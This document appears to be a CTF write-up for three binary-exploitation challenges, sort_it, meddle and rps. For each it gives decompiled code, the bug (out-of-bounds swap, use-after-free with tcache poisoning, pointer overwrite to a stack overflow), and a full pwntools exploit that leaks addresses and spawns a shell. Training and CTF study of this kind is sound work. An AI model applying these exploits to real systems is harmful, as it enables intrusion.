# sort_it

ps：比赛的时候没有做出来，所以仅在本地做了测试

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  __int64 v4; // rdx
  __int64 v5; // rsi
  __int64 v6; // rdx
  char v8; // [rsp+Fh] [rbp-71h]
  __int64 v9; // [rsp+10h] [rbp-70h] BYREF
  __int64 v10; // [rsp+18h] [rbp-68h] BYREF
  __int64 v11[12]; // [rsp+20h] [rbp-60h] BYREF

  v11[11] = __readfsqword(0x28u);
  v8 = 0;
  v11[0] = 'egnaro';
  v11[1] = 'eton';
  v11[2] = 'elppa';
  v11[3] = 'puc';
  v11[4] = 'daerb';
  v11[5] = 'arbez';
  v11[6] = 'dnah';
  v11[7] = 'naf';
  v11[8] = 'noil';
  v11[9] = 'licnep';
  clear(argc, argv, envp);
  puts("Sort the following words in alphabetical order.\n");
  print_words(v11);
  v3 = "Press any key to continue...";
  printf("Press any key to continue...");
  getchar();
  while ( v8 != 1 )
  {
    clear(v3, argv, v4);
    print_words(v11);
    printf("Enter the number for the word you want to select: ");
    __isoc99_scanf("%llu", &v9);
    getchar();
    --v9;
    printf("Enter the number for the word you want to replace it with: ");
    __isoc99_scanf("%llu", &v10);
    getchar();
    --v10;
    v5 = v9;
    swap(v11, v9, v10);
    clear(v11, v5, v6);
    print_words(v11);
    printf("Are the words sorted? [y/n]: ");
    argv = (const char **)(&word_10 + 1);
    v3 = &yn;
    fgets(&yn, 0x11, stdin);
    if ( yn != 'n' )
    {
      if ( yn != 'y' )
      {
        puts("Invalid choice");
        getchar();
        exit(0);
      }
      v8 = 1;
    }
  }
  if ( (unsigned int)check((__int64)v11) )
  {
    puts("You lose!");
    exit(0);
  }
  puts("You win!!!!!");
  return 0;
}
```

对数组中的元素进行排序，可以交换任意两个元素，这里存在明显的数组超界。通过数组超界泄露代码段基址，libc基址和栈地址。

在函数中没有栈溢出可以利用，但是`fgets(&yn, 0x11, stdin);`，这里多读了几个字节，我们可以将`gadget`放在这里。然后计算出栈到`yn`的距离，从将`gadget`转移到栈上。

最后我们还需要对数组进行排序才能正常的`ret`，所以为了方便我们通过同样的手段将所有的元素都变成一样的。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./sort_it'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('challenge.nahamcon.com on port', 31286)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so',checksec=False)

sh.send('\n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','14')
leak_libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = leak_libc - 	0x020840
binsh=libcbase+0x18ce17
system = libcbase+0x0453a0
leak('libc base',libcbase)

sh.sendlineafter('Are the words sorted? [y/n]: ','n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','13')
leak_main = u64(sh.recvuntil('\x55')[-6:].ljust(8,'\x00'))
textbase = leak_main- elf.sym['__libc_csu_init']
leak('text base',textbase)
pop_rdi = textbase + 0x00001643
yn= textbase+0x4030

sh.sendlineafter('Are the words sorted? [y/n]: ','n')
sh.sendlineafter('Enter the number for the word you want to select: ','1')
sh.sendlineafter('Enter the number for the word you want to replace it with: ','11')
stack = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-(0xe40-0xd00)
leak('leak_stack',stack)
sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi))
sh.sendlineafter('Enter the number for the word you want to select: ','1')

sh.sendlineafter('Enter the number for the word you want to replace it with: ','11')

sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(pop_rdi))
sh.sendlineafter('Enter the number for the word you want to select: ','14')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))

sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(binsh))
sh.sendlineafter('Enter the number for the word you want to select: ','15')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))
#gdb.attach(sh)
sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+p64(system))
sh.sendlineafter('Enter the number for the word you want to select: ','16')
sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))

for i in range(1,10):
    sh.sendlineafter('Are the words sorted? [y/n]: ','n'*8+'a'*8)
    sh.sendlineafter('Enter the number for the word you want to select: ',str(i))
    sh.sendlineafter('Enter the number for the word you want to replace it with: ',str((yn-stack)//8+2))
    
sh.sendlineafter('Are the words sorted? [y/n]: ','y')

sh.interactive()
```

# meddle

ps:test in local environment

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
int add_album()
{
  int v0; // eax
  __int64 v1; // rcx
  void **v2; // rax
  char *v4; // [rsp+8h] [rbp-8h]

  if ( count > 17 )
  {
    LODWORD(v2) = puts("no more albums :(");
  }
  else
  {
    v4 = (char *)malloc(0x84uLL);
    printf("enter album name: ");
    fgets(v4 + 4, 80, stdin);
    printf("enter artist name: ");
    fgets(v4 + 84, 48, stdin);
    v0 = count++;
    v1 = 8LL * v0;
    v2 = &albums;
    *(void **)((char *)&albums + v1) = v4;
  }
  return (int)v2;
}
```

**view**

```c
int view_album()
{
  __int64 v0; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  printf("what album would you like to view? ");
  v2 = getnum();
  if ( v2 < 0 || v2 >= count )
  {
    LODWORD(v0) = puts("invalid index :(");
  }
  else
  {
    v0 = (__int64)*(&albums + v2);
    if ( v0 )
    {
      printf("album name: %s\n", (const char *)*(&albums + v2) + 4);
      printf("artist: %s\n", (const char *)*(&albums + v2) + 84);
      LODWORD(v0) = printf("ratings: %d\n", *(unsigned int *)*(&albums + v2));
    }
  }
  return v0;
}
```

**rate**

```c
int rate_album()
{
  __int64 v0; // rax
  _DWORD *v1; // rbx
  int v3; // [rsp+Ch] [rbp-14h]

  printf("what album would you like to rate? ");
  v3 = getnum();
  if ( v3 < 0 || v3 >= count )
  {
    LODWORD(v0) = puts("invalid index :(");
  }
  else
  {
    v0 = (__int64)*(&albums + v3);
    if ( v0 )
    {
      printf("\nwhat do you want to rate this album? ");
      v1 = *(&albums + v3);
      LODWORD(v0) = getnum();
      *v1 = v0;
    }
  }
  return v0;
}
```

**delete**

```c
void delete_album()
{
  int v0; // [rsp+Ch] [rbp-4h]

  printf("what album would you like to delete? ");
  v0 = getnum();
  if ( v0 < 0 || v0 >= count )
    puts("invalid index :(");
  else
    free(*(&albums + v0));
}
```

漏洞点为`free`时没有将指针销毁，且没用任何标志，造成了UAF。libc版本为2.27，有`tcache`但是没有`double free`检查。

首先，将`tcache`填满，再利用UAF，leak `main_arena`的地址。之后利用`tcache_poisoning`，申请到`__free_hook`，将其覆写为`onegadget`

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./meddle'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',32446)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so')

def add(album, artist):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('enter album name: ')
    p.sendline(str(album))
    p.recvuntil('enter artist name: ')
    p.sendline(str(artist))
    
def view(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('what album would you like to view? ')
    p.sendline(str(index))

    
def rate(index,rate):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('what do you want to rate this album? ')
    p.sendline(str(rate))
    
    
def dele(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('what album would you like to delete? ')
    p.sendline(str(index))

for i in range(7):
    add(str(i)*4,str(i)*4)

add('aaa','aaa') # 7
add('bbb','bbb') # 8

for i in range(7):
    dele(i)

dele(7)
#gdb.attach(p)
view(7)

high_bits = hex(u16(p.recvuntil('\x7f')[-2:].ljust(2,b'\x00')))
p.recvuntil('ratings: ')
low_bits = "%x" % int(p.recvuntil('\n')[:-1])
main_arena = high_bits+low_bits
main_arena = int(main_arena.replace("-", ""), 16) - 96
leak('main_arena',main_arena)

malloc_hook = main_arena - 0x10
libcbase = main_arena - 0x3ebd00
offset = 0x7f158ab6a8e8-0x7f158ab68c30
free_hook = libcbase + libc.sym['__free_hook']
leak('malloc_hook',malloc_hook)
leak('libcbase',libcbase)
leak('free_hook',free_hook)

for i in range(5):
    add(str(i)*4,str(i)*4) #9 10 11 12 13

dele(12)
dele(12)
add(p32(free_hook >> 32), "bbb")#14
rate(12, free_hook & 0xffffffff)

add('nnn','nnn')#15

one_gadget = libcbase + 0x4f322
add(p32(one_gadget >> 32), "bbb") #16
rate(16, one_gadget & 0xffffffff)

p.recvuntil('> ')
p.sendline('5')

p.interactive()
```

# rps

## checksec

```shell
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
## IDA

```c
void play()
{
  unsigned int v0; // eax
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  int v2; // [rsp+8h] [rbp-8h]
  char v3; // [rsp+Fh] [rbp-1h]

  v3 = 1;
  v0 = time(0LL);
  srand(v0);
  while ( v3 )
  {
    v2 = rand() % 3 + 1;
    sub_4012C9();
    __isoc99_scanf(off_404028, &v1);
    getchar();
    if ( v2 == v1 )
      puts("Congrats you win!!!!!");
    else
      puts("You lose!");
    putchar(10);
    printf("Would you like to play again? [yes/no]: ");
    read(0, &s2, 0x19uLL);
    if ( !strcmp("no\n", &s2) )
    {
      v3 = 0;
    }
    else if ( !strcmp("yes\n", &s2) )
    {
      v3 = 1;
    }
    else
    {
      puts("Well you didn't say yes or no..... So I'm assuming no.");
      v3 = 0;
    }
    memset(&s2, 0, 4uLL);
  }
}
```

`read(0, &s2, 0x19uLL);`覆写`off_404028`，使其变成`%s`，从而产生溢出。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./rps'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',32446)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.31.so')

read_got = elf.got['read']
puts_plt = elf.plt['puts']
pop_rdi = 0x0000000000401513
one = [0xe6c7e,0xe6c81,0xe6c84]

p.sendlineafter('[y/n]: ',b'y')
p.sendlineafter('> ',b'1')
# gdb.attach(p)
payload = b'yes\n'+b'\x00'*(0x19-4-1)+b'\x08'
p.sendlineafter('[yes/no]: ',payload)

payload = b'a'*0x14+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(0x401453)
p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no\n')

read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libcbase = read_addr - libc.sym['read']
system = libcbase+libc.sym['system']
binsh=next(libc.search(b"/bin/sh"))
one_gadget = libcbase+one[1]
leak('libcbase',libcbase)
gdb.attach(p)
pop_4=0x000000000040150c
ret = 0x040101a
p.sendlineafter('[y/n]:',b'y')
payload = b'a'*0x14+p64(one_gadget)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no\n')

p.interactive()
```

